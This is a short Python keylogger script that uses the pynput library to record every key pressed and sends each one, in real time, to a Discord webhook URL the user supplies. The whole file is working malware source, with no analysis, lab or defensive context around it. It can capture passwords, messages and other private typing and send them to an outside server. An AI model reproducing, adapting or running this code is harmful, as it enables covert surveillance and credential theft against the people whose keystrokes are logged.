import time
from pynput import keyboard
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook          

webhook = input('discord webhook: ')

send = DiscordWebhook(url=webhook, content = "Starting new keylogger instance.")
send.execute()
print('starting keylogger')
def on_press(key):
    try:
        send = DiscordWebhook(url=webhook, content = key.char)
        time.sleep(1.5)
        send.execute()
    except AttributeError:
        time.sleep(1.5)
        send = DiscordWebhook(url=webhook, content = str(key))
        send.execute()
with Listener(on_press) as listener:
    listener.join()
